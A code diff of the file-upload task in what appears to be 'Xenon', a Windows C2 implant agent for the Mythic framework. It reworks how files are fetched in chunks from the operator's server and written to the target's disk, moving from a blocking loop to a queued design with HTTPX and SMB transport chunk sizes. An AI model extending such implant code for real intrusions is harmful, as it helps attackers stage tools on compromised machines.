@@ -1,6 +1,7 @@
 #include "Tasks/Upload.h"
 
 #include <windows.h>
+#include "Xenon.h"
 #include "Parser.h"
 #include "Package.h"
 #include "Task.h"
@@ -8,123 +9,144 @@
 
 #ifdef INCLUDE_CMD_UPLOAD
 
-#define CHUNK_SIZE  512000      // 512 KB
+#ifdef HTTPX_TRANSPORT
+#define CHUNK_SIZE  512000          // 512 KB
+#endif
+#ifdef SMB_TRANSPORT
+#define CHUNK_SIZE  (12 * 1024)     // 12 KB
+#endif
 
 
 /**
- * @brief Retrieve file from Mythic in chunks.
- * 
- * @param[in] taskUuid Task's UUID
- * @param[inout] upload FILE_UPLOAD struct which contains details of a file
- * @return DWORD
+ * @brief Request chunk of file upload from the server
  */
-DWORD UploadChunked(_In_ PCHAR taskUuid, _Inout_ FILE_UPLOAD* upload)
+VOID UploadGetChunk(_In_ PFILE_UPLOAD File)
 {
-    _dbg("Starting Chunked Upload...");
+    PPackage data = PackageInit(NULL, FALSE);
+    PackageAddByte(data, UPLOAD_CHUNKED);
+    PackageAddBytes(data, File->TaskUuid, TASK_UUID_SIZE, FALSE);
+    PackageAddInt32(data, File->currentChunk);
+    PackageAddBytes(data, File->fileUuid, TASK_UUID_SIZE, FALSE);
+    PackageAddString(data, File->filepath, TRUE);
+    PackageAddInt32(data, CHUNK_SIZE);
 
-    DWORD Status = 0;
+    PackageQueue(data);
+}
 
-    upload->currentChunk = 1;
 
-    do
+/**
+ * @brief Update any file upload chunks
+ */
+BOOL UploadSync(_In_ PCHAR TaskUuid, _Inout_ PPARSER Response)
+{   
+    UINT32 TotalChunks  = 0;
+    UINT32 CurrentChunk = 0;
+    PBYTE  ChunkBuf     = NULL;
+    SIZE_T bytesRead    = 0;
+
+    if (!TaskUuid || !Response)
+        return FALSE;
+
+    UINT32 Status = ParserGetInt32(Response);
+
+    /* Extract Upload Response Details */
+    TotalChunks  = ParserGetInt32(Response);
+    CurrentChunk = ParserGetInt32(Response);
+    ChunkBuf     = ParserGetBytes(Response, &bytesRead);
+
+    _dbg("Task Id [%s] : Received %d bytes for chunk %d / %d.", TaskUuid, bytesRead, CurrentChunk, TotalChunks);
+
+    PFILE_UPLOAD Current = xenonConfig->UploadQueue;
+    PFILE_UPLOAD Prev    = NULL;
+
+    while ( Current )
     {
-    /*
-     * Prepare the package to request current chunk
-     * - chunk_num
-     * - file_id
-     * - full_path
-     * - chunk_size
-    */
-        PPackage data = PackageInit(UPLOAD_CHUNKED, TRUE);
-        PackageAddString(data, taskUuid, FALSE);
-        PackageAddInt32(data, upload->currentChunk);
-        PackageAddBytes(data, upload->fileUuid, TASK_UUID_SIZE, FALSE);
-        PackageAddString(data, upload->filepath, TRUE);
-        PackageAddInt32(data, CHUNK_SIZE);
+        PFILE_UPLOAD Next = Current->Next;
 
-        // Send the package and receive the response
-        PARSER Response = { 0 };
-        PackageSend(data, &Response);
-        PackageDestroy(data);
-
-        BYTE success = ParserGetByte(&Response);
-        if (success == FALSE)
+        if ( strcmp(Current->TaskUuid, TaskUuid) == 0 )
         {
-            _err("UploadChunked returned failure status for chunk %d.", upload->currentChunk);
-            Status = ERROR_MYTHIC_UPLOAD;
-            ParserDestroy(&Response);
-            break;
-        }
-        
-    /*
-     * Response will ALWAYS hold data in the following order:
-     * - File_id
-     * - total_chunks
-     * - chunk_num
-     * - chunk_data
-    */
-        // Get file_id from response
-        SIZE_T uuidLen  = TASK_UUID_SIZE;
-        PCHAR fileUuid = ParserGetString(&Response, &uuidLen);
-        if (fileUuid == NULL) 
-        {
-            _err("Failed to get UUID from response.");
-            Status = ERROR_MYTHIC_UPLOAD;
-            ParserDestroy(&Response);
-            break;
-        }
-        
-        // Copy file_id
-        strncpy(upload->fileUuid, fileUuid, TASK_UUID_SIZE + 1);
-        upload->fileUuid[TASK_UUID_SIZE + 1] = '\0';
-        
-        // Get total_chunks from response
-        upload->totalChunks = ParserGetInt32(&Response);
+            /* Update Upload State */
+            Current->currentChunk = CurrentChunk;
+            Current->totalChunks  = TotalChunks;
 
-        // Current chunk number retrieved
-        upload->currentChunk = ParserGetInt32(&Response);
+            /* Write chunk if there is data */
+            if (bytesRead > 0)
+            {
+                DWORD bytesWritten = 0;
 
-        // Get chunk data from the response
-        SIZE_T bytesRead = 0;
-        PBYTE chunk = ParserGetBytes(&Response, &bytesRead);
-        if (!chunk)
-        {
-            _err("Failed to get chunk data for chunk %d.", upload->currentChunk);
-            Status = ERROR_MYTHIC_UPLOAD;
-            ParserDestroy(&Response);
-            break;
+                if ( !WriteFile(Current->hFile, ChunkBuf, (DWORD)bytesRead, &bytesWritten, NULL) )
+                {
+                    _err("Failed to write chunk to file. ERROR CODE: %d", GetLastError());
+                    return FALSE;
+                }
+
+                /* Send updates to operator */
+                _dbg("Wrote chunk %d (%d bytes)", CurrentChunk, bytesWritten);
+                PPackage Pkg = PackageInit(NULL, FALSE);
+                PackageAddFormatPrintf(Pkg, FALSE, "Uploaded %d / %d chunks ... \n\n", CurrentChunk, TotalChunks);
+                PackageUpdate(Current->TaskUuid, Pkg);
+            }
+
+            /* Last chunk → finalize upload */
+            if (CurrentChunk >= TotalChunks)
+            {
+                _dbg("Upload complete. %d / %d chunks", CurrentChunk, TotalChunks);
+
+                PackageComplete(Current->TaskUuid, NULL);
+
+                /* Unlink */
+                if (Prev)
+                    Prev->Next = Next;
+                else
+                    xenonConfig->UploadQueue = Next;
+
+                UploadFree(Current);
+                return TRUE;
+            }
+
+            /* Request next chunk */
+            Current->currentChunk = CurrentChunk + 1;
+            _dbg("Requesting next chunk %d", Current->currentChunk);
+            UploadGetChunk(Current);
+
+            return TRUE;
         }
 
-        _dbg("Received %d bytes for chunk %d.", bytesRead, upload->currentChunk);
+        Prev    = Current;
+        Current = Next;
+    }
 
-        // Write chunk data to the file
-        DWORD bytesWritten = 0;
-        if (!WriteFile(upload->hFile, chunk, (DWORD)bytesRead, &bytesWritten, NULL))
-        {
-            DWORD error = GetLastError();
-            _err("Failed to write to file. ERROR CODE: %d", error);
-            Status = error;
-            ParserDestroy(&Response);
-            break;
+    return FALSE;
+}
+
+
+/**
+ * @brief Add instance of FILE_UPLOAD to global tracker
+ */
+VOID UploadQueue(_In_ PFILE_UPLOAD File)
+{
+    _dbg("Adding file to upload queue...");
+    
+    PFILE_UPLOAD List = NULL;
+
+    if ( !File ) {
+        return;
+    }
+    
+    /* If there are no queued files, this is the first */
+    if ( !xenonConfig->UploadQueue )
+    {
+        xenonConfig->UploadQueue  = File;
+    }
+    else
+    {
+        /* Add to the end of linked-list */
+        List = xenonConfig->UploadQueue;
+        while ( List->Next ) {
+            List = List->Next;
         }
-
-        if (bytesWritten != bytesRead)
-        {
-            _err("Incomplete write for chunk %d. Expected: %d, Written: %d", upload->currentChunk, bytesRead, bytesWritten);
-            Status = ERROR_MYTHIC_UPLOAD;
-            ParserDestroy(&Response);
-            break;
-        }
-
-        // Clean up and prepare for the next chunk
-        upload->currentChunk++;
-        ParserDestroy(&Response);
-
-    } while (upload->currentChunk <= upload->totalChunks);
-
-    _dbg("Chunked upload complete. Total chunks processed: %d", upload->currentChunk - 1);
-
-    return Status;
+        List->Next  = File;
+    }
 }
 
 
@@ -145,64 +167,71 @@ VOID Upload(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     }
 
     DWORD status;
-    HANDLE hFile    = NULL;
-    SIZE_T uuidLen  = 0;
-    SIZE_T pathLen  = 0;
+    HANDLE hFile        = NULL;
+    SIZE_T uuidLen      = 0;
+    SIZE_T pathLen      = 0;
+    PCHAR  FileUuid     = NULL;
+    PCHAR  UploadPath   = NULL;
+    PFILE_UPLOAD File   = NULL;
 
-    FILE_UPLOAD upload  = { 0 };
+    File = (PFILE_UPLOAD)LocalAlloc(LPTR, sizeof(FILE_UPLOAD));         // Must Free
 
-    PCHAR fileUuid      = ParserGetString(arguments, &uuidLen);
-    PCHAR uploadPath    = ParserGetString(arguments, &pathLen);
+    if ( File == NULL )
+    {
+        _err("Failed to allocate for file upload");
+        return;
+    }
 
-    // Need to get the file in chunks until finished now
-    upload.hFile = CreateFileA(uploadPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (upload.hFile == INVALID_HANDLE_VALUE)
+    /* Set Details for Upload */
+    FileUuid    = ParserGetString(arguments, &uuidLen);
+    UploadPath  = ParserGetString(arguments, &pathLen);
+
+    strncpy(File->fileUuid, FileUuid, uuidLen);
+    strncpy(File->filepath, UploadPath, pathLen);
+    strncpy(File->TaskUuid, taskUuid, TASK_UUID_SIZE);
+
+    File->currentChunk = 1;
+
+
+    File->hFile = CreateFileA(UploadPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (File->hFile == INVALID_HANDLE_VALUE)
     {
         DWORD error = GetLastError();
-        _err("Error opening file %s : ERROR CODE %d", uploadPath, error);
+        _err("Error opening file %s : ERROR CODE %d", UploadPath, error);
         PackageError(taskUuid, error);
         goto end;
     }
 
-    strncpy(upload.filepath, uploadPath, pathLen);
-    strncpy(upload.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
-    upload.fileUuid[TASK_UUID_SIZE + 1] = '\0';
+    _dbg("[UPLOAD] FilePath: %s | FileUUID: %s", File->filepath, File->fileUuid);
 
-    // Retrieve file in chunked sections
-    status = UploadChunked(taskUuid, &upload);
-    if ( status != 0 )
-    {
-        PackageError(taskUuid, status);
-        goto end;
-    }
-
-    PackageComplete(taskUuid, NULL);
+    /* Get first chunk from server */
+    UploadGetChunk(File);
+    
+    /* Add Upload Instance to Queue */
+    UploadQueue(File);
 
 end:
-    // Cleanup 
-    if (upload.hFile) CloseHandle(upload.hFile);
 
+    return;
 }
 
-/**
- * @brief Thread entrypoint for Upload function. 
- * 
- * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
- * 
- * @return DWORD WINAPI
- */
-DWORD WINAPI UploadThread(_In_ LPVOID lpTaskParamter)
-{
-    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;
 
-    Upload(tp->TaskUuid, tp->TaskParser);
-    
-    _dbg("Upload Thread cleaning up now...");
-    // Cleanup things used for thread
-    free(tp->TaskUuid);
-    ParserDestroy(tp->TaskParser);
-    LocalFree(tp);  
-    return 0;
+/**
+ * @brief Free the upload
+ */
+VOID UploadFree(_In_ PFILE_UPLOAD File)
+{
+    if ( !File )
+        return;
+
+    if ( File->hFile ) 
+    {
+        CloseHandle(File->hFile);
+        File->hFile = NULL;
+    }
+
+    LocalFree(File);
+    File = NULL;
 }
 
 
